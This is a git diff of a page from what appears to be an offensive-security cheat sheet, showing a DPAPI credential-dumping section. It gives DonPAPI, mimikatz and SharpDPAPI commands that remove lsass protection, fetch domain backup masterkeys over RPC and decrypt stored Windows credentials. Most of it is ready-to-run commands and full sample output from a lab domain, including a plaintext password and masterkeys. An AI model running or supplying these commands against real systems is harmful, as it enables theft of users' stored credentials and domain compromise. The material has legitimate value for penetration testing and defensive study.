+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl"><span class="go">DonPAPI collect -d <span class="o">&lt;DOMAIN&gt;</span> -u '<span class="o">&lt;USER&gt;</span>' -H <span class="o">&lt;HASH&gt;</span> -t <span class="o">&lt;TARGET&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a></em></small></p></div></div>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
-</span></span><span class="line"><span class="cl"><span class="go">DonPAPI collect -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -t &lt;TARGET&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With <span class="nb">hash</span>
-</span></span><span class="line"><span class="cl"><span class="go">DonPAPI collect -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -H &lt;HASH&gt; -t &lt;TARGET&gt;
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a></em></small></p></div></p>
+<p></p>
 <h3 id="abuse-1-credentials-dump-from-windows">Abuse #1: Credentials dump (From Windows)</h3>
-<p>
-<button data-tabset="set2" data-tabcontent="tab1" >mimikatz</button>
+<p class="tabs">
+<button data-tabset="set2" data-tabcontent="tab1" class="active">mimikatz</button>
 
-<button data-tabset="set2" data-tabcontent="tab2" >SharpDPAPI</button>
+<button data-tabset="set2" data-tabcontent="tab2">SharpDPAPI</button>
 
-<button data-tabset="set2" data-tabcontent="tab3" >sliver</button>
+<button data-tabset="set2" data-tabcontent="tab3">sliver</button>
 
-<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-info-gathering">1. Info Gathering</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cmd /c &#34;dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect&#34;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\users\PPotts&gt; cmd /c &#34;dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Protect&#34;
+</p><div class="tabset-wrapper" data-tabset-group="set2"><div class="tabcontent active" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-info-gathering">1. Info Gathering</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cmd /c "dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Protect"
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\users\PPotts&gt; cmd /c "dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Protect"
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> Volume in drive C has no label.
 </span></span></span><span class="line"><span class="cl"><span class="go"> Volume Serial Number is C626-9388
@@ -414,18 +399,19 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">     Total Files Listed:
 </span></span></span><span class="line"><span class="cl"><span class="go">               7 File(s)          3,244 bytes
 </span></span></span><span class="line"><span class="cl"><span class="go">               5 Dir(s)   5,175,238,656 bytes free
-</span></span></span></code></pre></div><h4 id="2-decrypt-credentials">2. Decrypt credentials</h4>
-<p><button data-tabset="set2-1" data-tabcontent="tab1" class="active">With Password</button>
-<button data-tabset="set2-1" data-tabcontent="tab2" >Without Password</button></p>
-<div class="tabcontent" data-tabset="set2-1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;token::elevate&#34; &#34;!+&#34; &#34;!processprotect /process:lsass.exe /remove&#34; &#34;dpapi::cred /in:C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34; &#34;dpapi::masterkey /in:C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /sid:&lt;SID&gt; /password:&lt;PASSWORD&gt; /protected&#34; &#34;dpapi::cred /in:C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34; &#34;exit&#34;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\mimikatz.exe &#34;token::elevate&#34; &#34;!+&#34; &#34;!processprotect /process:lsass.exe /remove&#34; &#34;dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23&#34; &#34;dpapi::masterkey /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Protect\S-1-5-21-4088429403-1159899800-2753317549-1603\56a4e7f0-7ae5-4a66-86c8-abb9aa484acd /sid:S-1-5-21-4088429403-1159899800-2753317549-1603 /password:D43d4lusB1ll1ngB055 /protected&#34; &#34;dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23&#34; &#34;exit&#34;
+</span></span></span></div></pre></div><h4 id="2-decrypt-credentials">2. Decrypt credentials</h4>
+<p class="tabs"><button data-tabset="set2-1" data-tabcontent="tab1" class="active">With Password</button>
+<button data-tabset="set2-1" data-tabcontent="tab2">Without Password</button></p>
+<div class="tabset-wrapper" data-tabset-group="set2-1"><div class="tabcontent active" data-tabset="set2-1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "dpapi::cred /in:C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Credentials\<span class="o">&lt;CREDENTIALS_HASH&gt;</span>" "dpapi::masterkey /in:C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Protect\<span class="o">&lt;SID&gt;</span>\<span class="o">&lt;MASTERKEY_GUID&gt;</span> /sid:<span class="o">&lt;SID&gt;</span> /password:<span class="o">&lt;PASSWORD&gt;</span> /protected" "dpapi::cred /in:C:\Users\<span class="o">&lt;USER&gt;</span>\AppData\Roaming\Microsoft\Credentials\<span class="o">&lt;CREDENTIALS_HASH&gt;</span>" "exit"
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23" "dpapi::masterkey /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Protect\S-1-5-21-4088429403-1159899800-2753317549-1603\56a4e7f0-7ae5-4a66-86c8-abb9aa484acd /sid:S-1-5-21-4088429403-1159899800-2753317549-1603 /password:D43d4lusB1ll1ngB055 /protected" "dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23" "exit"
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
-</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 </span></span></span><span class="line"><span class="cl"><span class="go"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 </span></span></span><span class="line"><span class="cl"><span class="go"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
-</span></span></span><span class="line"><span class="cl"><span class="go"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-</span></span></span><span class="line"><span class="cl"><span class="go">  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span></span><span class="line"><span class="cl"><span class="go"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span></span></span><span class="line"><span class="cl"><span class="go">  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # token::elevate
 </span></span></span><span class="line"><span class="cl"><span class="go">Token Id  : 0
@@ -484,17 +470,17 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
 </span></span></span><span class="line"><span class="cl"><span class="go">Bye!
-</span></span></span></code></pre></div></div>
-<div class="tabcontent" data-tabset="set2-1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Try different MASTERKEY_GUID to get masterkeys
-</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;dpapi::masterkey /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /rpc&#34; &#34;exit&#34;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\mimikatz.exe &#34;dpapi::masterkey /in:C:\users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc&#34; &#34;exit&#34;
+</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set2-1" data-tabcontent="tab2"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Try different MASTERKEY_GUID to get masterkeys
+</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe "dpapi::masterkey /in:C:\users\<span class="o">&lt;USER&gt;</span>\appdata\roaming\microsoft\protect\<span class="o">&lt;SID&gt;</span>\<span class="o">&lt;MASTERKEY_GUID&gt;</span> /rpc" "exit"
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\mimikatz.exe "dpapi::masterkey /in:C:\users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" "exit"
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
-</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 </span></span></span><span class="line"><span class="cl"><span class="go"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 </span></span></span><span class="line"><span class="cl"><span class="go"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
-</span></span></span><span class="line"><span class="cl"><span class="go"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-</span></span></span><span class="line"><span class="cl"><span class="go">  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span></span><span class="line"><span class="cl"><span class="go"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span></span></span><span class="line"><span class="cl"><span class="go">  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # dpapi::masterkey /in:C:\users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
 </span></span></span><span class="line"><span class="cl"><span class="go">**MASTERKEYS**
@@ -502,23 +488,24 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[domainkey] with RPC
-</span></span></span><span class="line"><span class="cl"><span class="go">[DC] &#39;office.htb&#39; will be the domain
-</span></span></span><span class="line"><span class="cl"><span class="go">[DC] &#39;DC.office.htb&#39; will be the DC server
+</span></span></span><span class="line"><span class="cl"><span class="go">[DC] 'office.htb' will be the domain
+</span></span></span><span class="line"><span class="cl"><span class="go">[DC] 'DC.office.htb' will be the DC server
 </span></span></span><span class="line"><span class="cl"><span class="go">  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
 </span></span></span><span class="line"><span class="cl"><span class="go">  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
 </span></span></span><span class="line"><span class="cl"><span class="go">Bye!
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Decrypt credentials
-</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;dpapi::cred /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\credentials\&lt;CREDENTIALS_HASH&gt; /masterkey:&lt;MASTERKEY&gt;&#34; &#34;exit&#34;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\mimikatz.exe &#34;dpapi::cred /in:C:\users\PPotts\appdata\roaming\microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166&#34; &#34;exit&#34;
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Decrypt credentials
+</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe "dpapi::cred /in:C:\users\<span class="o">&lt;USER&gt;</span>\appdata\roaming\microsoft\credentials\<span class="o">&lt;CREDENTIALS_HASH&gt;</span> /masterkey:<span class="o">&lt;MASTERKEY&gt;</span>" "exit"
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\mimikatz.exe "dpapi::cred /in:C:\users\PPotts\appdata\roaming\microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" "exit"
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
-</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 </span></span></span><span class="line"><span class="cl"><span class="go"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 </span></span></span><span class="line"><span class="cl"><span class="go"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
-</span></span></span><span class="line"><span class="cl"><span class="go"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-</span></span></span><span class="line"><span class="cl"><span class="go">  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span></span><span class="line"><span class="cl"><span class="go"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span></span></span><span class="line"><span class="cl"><span class="go">  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # dpapi::cred /in:C:\users\PPotts\appdata\roaming\microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
 </span></span></span><span class="line"><span class="cl"><span class="go">**BLOB**
@@ -550,11 +537,11 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
 </span></span></span><span class="line"><span class="cl"><span class="go">Bye!
-</span></span></span></code></pre></div></div></div>
-
-<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as system
+</span></span></span></div></pre></div></div></div>
+</div><div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as system
 </span></span><span class="line"><span class="cl"><span class="go">.\SharpDPAPI.exe machinetriage
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\SharpDPAPI.exe machinetriage
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\SharpDPAPI.exe machinetriage
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  __                 _   _       _ ___ 
 </span></span></span><span class="line"><span class="cl"><span class="go"> (_  |_   _. ._ ._  | \ |_) /\  |_) |  
@@ -782,11 +769,13 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SharpDPAPI completed in 00:00:02.1950513
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user
-</span></span><span class="line"><span class="cl"><span class="go">.\SharpDPAPI.exe credentials /password:&#39;&lt;PASSWORD&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user <span class="o">(</span>without password<span class="o">)</span>
+</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user
+</span></span><span class="line"><span class="cl"><span class="go">.\SharpDPAPI.exe credentials /password:'<span class="o">&lt;PASSWORD&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
